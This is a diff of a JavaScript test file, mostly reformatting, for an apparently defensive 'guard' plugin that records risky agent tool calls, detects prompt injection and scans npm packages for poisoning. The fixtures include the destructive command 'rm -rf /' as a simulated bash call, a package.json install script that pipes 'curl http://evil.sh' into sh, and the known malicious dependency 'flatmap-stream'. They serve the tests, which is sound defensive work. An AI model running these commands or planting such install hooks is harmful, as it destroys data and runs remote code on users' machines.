@@ -14,7 +14,14 @@ import { inspectPackageJson, localPathOf, scanPackage } from '../lib/poison.js'
 import { extractUserText, truncateText, isPluginInjected } from '../lib/injection.js'
 import { extractPluginAdd, truncateCommand } from '../lib/guard.js'
 import {
-  bootPlugin, mockRequest, mockResponse, invoke, jsonOf, dispatchEvent, bashExec, settle,
+  bootPlugin,
+  mockRequest,
+  mockResponse,
+  invoke,
+  jsonOf,
+  dispatchEvent,
+  bashExec,
+  settle,
 } from './lib/helpers.mjs'
 
 const disposeAlls = []
@@ -84,7 +91,9 @@ test('store: persist failure is logged, not thrown', async () => {
   // 让 guard 目录不可写：先建一个同名文件占位（mkdir 会失败）
   writeFileSync(join(home, 'guard'), 'file blocks dir')
   const { listeners, disposeAll } = boot({}, { home })
-  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({ kind: 'allow' }))
+  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
+    kind: 'allow',
+  }))
   await settle(700)
   assert.doesNotThrow(() => disposeAll())
 })
@@ -94,7 +103,9 @@ test('store: dispose flushes pending buffer when not ready', async () => {
   tmpDirs.push(home)
   const { listeners, disposeAll } = boot({}, { home })
   // 立即记录（加载未完成 → pending），然后立即 dispose
-  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({ kind: 'allow' }))
+  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
+    kind: 'allow',
+  }))
   disposeAll()
   disposeAlls.splice(disposeAlls.indexOf(disposeAll), 1)
   await settle(200)
@@ -106,16 +117,26 @@ test('store: dispose flushes pending buffer when not ready', async () => {
 
 test('store: confirm on already-confirmed alert is idempotent', async () => {
   const { listeners, api, disposeAll } = boot({})
-  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({ kind: 'allow' }))
+  await dispatchEvent(listeners, 'tools/pre-execute', bashExec('s-1', 'rm -rf /'), async () => ({
+    kind: 'allow',
+  }))
   await settle(80)
   const res = mockResponse()
   await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
   const id = jsonOf(res).value[0].id
   const first = mockResponse()
-  await invoke(api, mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }), first)
+  await invoke(
+    api,
+    mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }),
+    first,
+  )
   assert.equal(jsonOf(first).value.confirmed, true)
   const second = mockResponse()
-  await invoke(api, mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }), second)
+  await invoke(
+    api,
+    mockRequest({ url: '/guard/api/alerts/confirm', method: 'POST', body: JSON.stringify({ id }) }),
+    second,
+  )
   assert.equal(jsonOf(second).value.confirmed, true)
   disposeAll()
 })
@@ -135,16 +156,29 @@ test('routes: webRuntime undefined / null / non-array trustedHosts', async () =>
 test('routes: scan accepts a local .tgz tarball path', async () => {
   const src = mkdtempSync(join(tmpdir(), 'dsh-guard-mut2-tar-'))
   tmpDirs.push(src)
-  writeFileSync(join(src, 'package.json'), JSON.stringify({
-    name: 'tar-evil', version: '1.0.0', scripts: { install: 'curl http://evil.sh | sh' },
-  }))
+  writeFileSync(
+    join(src, 'package.json'),
+    JSON.stringify({
+      name: 'tar-evil',
+      version: '1.0.0',
+      scripts: { install: 'curl http://evil.sh | sh' },
+    }),
+  )
   const tarball = join(tmpdir(), `dsh-guard-mut2-${Date.now()}.tgz`)
   tmpDirs.push(tarball)
   const { execFileSync } = await import('node:child_process')
   execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
   const { api, disposeAll } = boot({})
   const res = mockResponse()
-  await invoke(api, mockRequest({ url: '/guard/api/scan', method: 'POST', body: JSON.stringify({ target: tarball }) }), res)
+  await invoke(
+    api,
+    mockRequest({
+      url: '/guard/api/scan',
+      method: 'POST',
+      body: JSON.stringify({ target: tarball }),
+    }),
+    res,
+  )
   assert.equal(res.writeHeadStatus, 200)
   assert.ok(jsonOf(res).value.findings.length >= 1, 'tarball findings')
   disposeAll()
@@ -173,10 +207,15 @@ test('injection: event with non-object data is ignored', async () => {
 
 test('injection: message with non-text blocks yields no alert', async () => {
   const { listeners, api, disposeAll } = boot({})
-  await dispatchEvent(listeners, 'session/event', { id: 's-1' }, {
-    type: 'user/message',
-    data: { content: [{ type: 'image', url: 'x' }], source: { kind: 'user' } },
-  })
+  await dispatchEvent(
+    listeners,
+    'session/event',
+    { id: 's-1' },
+    {
+      type: 'user/message',
+      data: { content: [{ type: 'image', url: 'x' }], source: { kind: 'user' } },
+    },
+  )
   await settle(80)
   const res = mockResponse()
   await invoke(api, mockRequest({ url: '/guard/api/alerts' }), res)
@@ -185,7 +224,15 @@ test('injection: message with non-text blocks yields no alert', async () => {
 })
 
 test('injection: extractUserText handles mixed blocks and bad shapes', () => {
-  assert.equal(extractUserText({ content: [{ type: 'text', text: 'a' }, { type: 'tool', id: 't' }] }), 'a')
+  assert.equal(
+    extractUserText({
+      content: [
+        { type: 'text', text: 'a' },
+        { type: 'tool', id: 't' },
+      ],
+    }),
+    'a',
+  )
   assert.equal(extractUserText({ content: [{ type: 'text', text: 42 }] }), '')
   assert.equal(extractUserText({ content: null }), '')
 })
@@ -205,21 +252,30 @@ test('injection: isPluginInjected handles missing source', () => {
 // ── poison：inspect 分支 ───────────────────────────────────────────────────
 
 test('poison: inspectPackageJson handles non-object scripts and non-string script values', () => {
-  const findings = inspectPackageJson(JSON.stringify({
-    scripts: 'nope',
-    dependencies: null,
-  }), 'package.json')
+  const findings = inspectPackageJson(
+    JSON.stringify({
+      scripts: 'nope',
+      dependencies: null,
+    }),
+    'package.json',
+  )
   assert.deepEqual(findings, [])
-  const findings2 = inspectPackageJson(JSON.stringify({
-    scripts: { install: 42 },
-  }), 'package.json')
+  const findings2 = inspectPackageJson(
+    JSON.stringify({
+      scripts: { install: 42 },
+    }),
+    'package.json',
+  )
   assert.deepEqual(findings2, [])
 })
 
 test('poison: inspectPackageJson flags malicious dep in optionalDependencies', () => {
-  const findings = inspectPackageJson(JSON.stringify({
-    optionalDependencies: { 'flatmap-stream': '^1.0.0' },
-  }), 'package.json')
+  const findings = inspectPackageJson(
+    JSON.stringify({
+      optionalDependencies: { 'flatmap-stream': '^1.0.0' },
+    }),
+    'package.json',
+  )
   assert.ok(findings.some((f) => f.id === 'malicious-dependency'))
 })
 
